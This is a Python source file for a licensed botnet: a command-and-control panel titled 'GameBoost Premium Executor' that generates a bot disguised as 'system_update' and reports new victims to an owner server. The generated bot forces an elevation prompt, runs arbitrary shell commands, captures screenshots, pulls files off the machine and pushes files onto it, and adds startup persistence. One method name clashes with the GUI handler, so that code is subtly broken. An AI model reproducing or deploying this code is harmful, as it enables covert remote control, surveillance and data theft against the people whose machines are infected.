import socket
import threading
import json
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import random
import platform
import os
from datetime import datetime

LICENSE_KEY = "{{LICENSE_KEY}}"
OWNER_HOST = "localhost"
OWNER_PORT = 9999

class BuyerClient:
    def __init__(self):
        self.license_key = LICENSE_KEY
        self.bots = {}
        self.c2_port = random.randint(10000, 60000)
        self.server = None
        self.connected = False
        self.setup_gui()
        
    def connect_to_owner(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((OWNER_HOST, OWNER_PORT))
            msg = {'type': 'register', 'license_key': self.license_key}
            sock.send(json.dumps(msg).encode())
            response = json.loads(sock.recv(1024).decode())
            sock.close()
            if response.get('status') == 'success':
                self.connected = True
                return True
            return False
        except Exception as e:
            print(f"Connection error: {e}")
            return False
            
    def start_c2_server(self):
        def handle_client(conn, addr):
            try:
                data = conn.recv(1024).decode()
                info = json.loads(data)
                bot_id = info.get('bot_id', 'unknown')
                self.bots[bot_id] = {
                    'conn': conn, 
                    'info': info, 
                    'addr': addr, 
                    'last_seen': datetime.now()
                }
                self.update_display()
                
                # Notify owner server about new bot
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((OWNER_HOST, OWNER_PORT))
                    notify_msg = {
                        'type': 'bot_connected',
                        'bot_id': bot_id,
                        'buyer_key': self.license_key,
                        'system_info': info.get('system_info', {})
                    }
                    sock.send(json.dumps(notify_msg).encode())
                    sock.close()
                except Exception as e:
                    print(f"Failed to notify owner: {e}")
                    
            except Exception as e:
                print(f"Error handling bot: {e}")
                
        def server_loop():
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind(('0.0.0.0', self.c2_port))
            self.server.listen(5)
            while True:
                try:
                    conn, addr = self.server.accept()
                    threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
                except:
                    break
                    
        threading.Thread(target=server_loop, daemon=True).start()
        return True
        
    def create_bot_file(self):
        # Get local IP for bot connection
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "127.0.0.1"
        
        # Create bot file with buyer IP (NO LICENSE KEY NEEDED)
        bot_code = f"""import socket
import json
import platform
import os
import subprocess
import time
import random
import ctypes
import sys
import base64
from datetime import datetime

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

socket.setdefaulttimeout(30)

BUYER_IP = "{local_ip}"
BUYER_PORT = {self.c2_port}

def get_system_info():
    return {{
        "os": platform.system(),
        "hostname": platform.node(), 
        "username": os.getenv("USERNAME", "unknown"),
        "architecture": platform.architecture()[0],
        "admin_access": "Full",
        "network_access": "Full",
        "timestamp": datetime.now().isoformat()
    }}

def execute_command(command):
    try:
        if command.startswith("cmd:"):
            result = subprocess.run(command[4:], shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
        elif command == "sysinfo":
            output = json.dumps(get_system_info(), indent=2)
        elif command == "screenshot":
            try:
                import pyautogui
                screenshot = pyautogui.screenshot()
                import io
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format='PNG')
                output = base64.b64encode(img_bytes.getvalue()).decode()
            except:
                output = "Screenshot failed"
        elif command.startswith("download:"):
            filepath = command[9:]
            try:
                with open(filepath, 'rb') as f:
                    output = base64.b64encode(f.read()).decode()
            except Exception as e:
                output = f"Download failed: {{str(e)}}"
        elif command.startswith("upload:"):
            parts = command[7:].split(":", 1)
            if len(parts) == 2:
                filename, filedata = parts
                try:
                    with open(filename, 'wb') as f:
                        f.write(base64.b64decode(filedata))
                    output = f"Uploaded {{filename}}"
                except Exception as e:
                    output = f"Upload failed: {{str(e)}}"
            else:
                output = "Invalid upload command"
        elif command == "persistence":
            try:
                if platform.system() == "Windows":
                    import winreg
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                        winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
                    output = "Persistence added to Windows startup"
                else:
                    output = "Persistence only supported on Windows"
            except Exception as e:
                output = f"Persistence failed: {{str(e)}}"
        else:
            output = f"Command executed: {{command}}"
    except Exception as e:
        output = f"Error: {{str(e)}}"
    return output

def connect_to_buyer():
    bot_id = f"{{platform.node()}}-{{os.getenv('USERNAME', 'user')}}-{{random.randint(1000,9999)}}"
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((BUYER_IP, BUYER_PORT))
            
            connect_msg = {{
                "bot_id": bot_id,
                "system_info": get_system_info(),
                "status": "connected",
                "timestamp": datetime.now().isoformat()
            }}
            
            sock.send(json.dumps(connect_msg).encode())
            
            while True:
                command = sock.recv(1024).decode()
                if not command:
                    break
                output = execute_command(command)
                sock.send(output.encode())
                
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    connect_to_buyer()
"""
        filename = f"system_update_{random.randint(1000,9999)}.py"
        with open(filename, "w", encoding='utf-8') as f:
            f.write(bot_code)
        return filename
        
    def setup_gui(self):
        self.root = tk.Tk()
        self.root.title("GameBoost Premium Executor")
        self.root.geometry("1000x700")
        self.root.configure(bg='#1e1e1e')
        
        # Header
        header = tk.Frame(self.root, bg='#1e1e1e')
        header.pack(fill='x', padx=20, pady=10)
        
        tk.Label(header, text="GAMEBOOST PREMIUM EXECUTOR", 
                bg='#1e1e1e', fg='white', font=('Arial', 16, 'bold')).pack(side='left')
        
        self.status_label = tk.Label(header, text="Status: Ready", bg='#1e1e1e', fg='white')
        self.status_label.pack(side='right')
        
        # Main content
        main = tk.Frame(self.root, bg='#1e1e1e')
        main.pack(fill='both', expand=True, padx=20, pady=10)
        
        # Left panel
        left = tk.Frame(main, bg='#1e1e1e')
        left.pack(side='left', fill='y', padx=(0, 10))
        
        # License info
        license_frame = tk.LabelFrame(left, text="License Information", bg='#1e1e1e', fg='white')
        license_frame.pack(fill='x', pady=(0, 10))
        
        tk.Label(license_frame, text=f"License: {LICENSE_KEY}", bg='#1e1e1e', fg='#00ff00', 
                font=('Courier', 10), wraplength=200).pack(pady=10)
        
        # Controls
        control_frame = tk.LabelFrame(left, text="C2 Controls", bg='#1e1e1e', fg='white')
        control_frame.pack(fill='x', pady=(0, 10))
        
        tk.Button(control_frame, text="🔄 Activate License", command=self.activate_license,
                 bg='#2d2d30', fg='white').pack(pady=5, fill='x')
        
        tk.Button(control_frame, text="🚀 Start C2 Server", command=self.start_c2_server,
                 bg='#2d2d30', fg='white').pack(pady=5, fill='x')
        
        tk.Button(control_frame, text="🤖 Generate Bot", command=self.generate_bot,
                 bg='#2d2d30', fg='white').pack(pady=5, fill='x')
        
        # Command section
        cmd_frame = tk.LabelFrame(left, text="Bot Commands", bg='#1e1e1e', fg='white')
        cmd_frame.pack(fill='x', pady=(0, 10))
        
        tk.Label(cmd_frame, text="Command:", bg='#1e1e1e', fg='white').pack(anchor='w')
        self.cmd_entry = tk.Entry(cmd_frame, bg='#2d2d30', fg='white')
        self.cmd_entry.pack(fill='x', pady=5)
        self.cmd_entry.insert(0, "cmd:whoami")
        
        tk.Button(cmd_frame, text="📡 Send to All Bots", command=self.send_command,
                 bg='#2d2d30', fg='white').pack(pady=5, fill='x')
        
        # Stats
        stats_frame = tk.LabelFrame(left, text="Statistics", bg='#1e1e1e', fg='white')
        stats_frame.pack(fill='x', pady=(0, 10))
        
        self.bots_label = tk.Label(stats_frame, text="Connected Bots: 0", bg='#1e1e1e', fg='white')
        self.bots_label.pack(anchor='w')
        
        self.port_label = tk.Label(stats_frame, text="C2 Port: Not running", bg='#1e1e1e', fg='white')
        self.port_label.pack(anchor='w')
        
        # Right panel
        right = tk.Frame(main, bg='#1e1e1e')
        right.pack(side='right', fill='both', expand=True)
        
        # Notebook for tabs
        notebook = ttk.Notebook(right)
        notebook.pack(fill='both', expand=True)
        
        # Bots tab
        bots_tab = tk.Frame(notebook, bg='#1e1e1e')
        notebook.add(bots_tab, text="🤖 Connected Bots")
        
        self.bot_tree = ttk.Treeview(bots_tab, columns=("ID", "OS", "User", "IP", "Last Seen"), show="headings")
        self.bot_tree.heading("ID", text="Bot ID")
        self.bot_tree.heading("OS", text="OS")
        self.bot_tree.heading("User", text="Username")
        self.bot_tree.heading("IP", text="IP Address")
        self.bot_tree.heading("Last Seen", text="Last Seen")
        
        scrollbar = ttk.Scrollbar(bots_tab, orient="vertical", command=self.bot_tree.yview)
        self.bot_tree.configure(yscrollcommand=scrollbar.set)
        
        self.bot_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        # Logs tab
        logs_tab = tk.Frame(notebook, bg='#1e1e1e')
        notebook.add(logs_tab, text="📋 Logs")
        
        self.log_text = scrolledtext.ScrolledText(logs_tab, bg='#2d2d30', fg='white', font=('Consolas', 9))
        self.log_text.pack(fill='both', expand=True)
        
        # Start UI updates
        self.root.after(1000, self.update_display)
        self.root.mainloop()
        
    def activate_license(self):
        if self.connect_to_owner():
            self.status_label.config(text="Status: ✅ Connected", fg="green")
            self.log_message("License activated successfully!")
        else:
            self.status_label.config(text="Status: ❌ Failed", fg="red")
            self.log_message("License activation failed!")
            
    def start_c2_server(self):
        if not self.connected:
            messagebox.showerror("Error", "Please activate license first!")
            return
            
        if self.start_c2_server():
            self.status_label.config(text=f"Status: ✅ C2 Running on port {self.c2_port}")
            self.port_label.config(text=f"C2 Port: {self.c2_port}")
            self.log_message(f"C2 server started on port {self.c2_port}")
            
    def generate_bot(self):
        if not hasattr(self, 'c2_port') or not self.connected:
            messagebox.showerror("Error", "Please activate license and start C2 server first!")
            return
            
        bot_file = self.create_bot_file()
        self.log_message(f"Bot file created: {bot_file}")
        messagebox.showinfo("Success", f"Bot file created: {bot_file}")
        
    def send_command(self):
        command = self.cmd_entry.get().strip()
        if command and self.bots:
            for bot_id, bot_info in self.bots.items():
                try:
                    bot_info['conn'].send(command.encode())
                    self.log_message(f"Sent command to {bot_id}: {command}")
                except:
                    self.log_message(f"Failed to send command to {bot_id}")
                    del self.bots[bot_id]
            self.update_display()
        else:
            messagebox.showwarning("Warning", "No command entered or no bots connected!")
            
    def update_display(self):
        self.bots_label.config(text=f"Connected Bots: {len(self.bots)}")
        
        # Update bot tree
        for item in self.bot_tree.get_children():
            self.bot_tree.delete(item)
            
        for bot_id, bot_info in self.bots.items():
            sys_info = bot_info.get('info', {})
            last_seen = bot_info.get('last_seen', 'Unknown')
            if hasattr(last_seen, 'strftime'):
                last_seen = last_seen.strftime("%H:%M:%S")
                
            self.bot_tree.insert("", "end", values=(
                bot_id,
                sys_info.get('os', 'Unknown'),
                sys_info.get('username', 'Unknown'),
                bot_info.get('addr', ['Unknown'])[0],
                last_seen
            ))
        
        self.root.after(2000, self.update_display)
        
    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\\n")
        self.log_text.see(tk.END)

if __name__ == "__main__":
    client = BuyerClient()
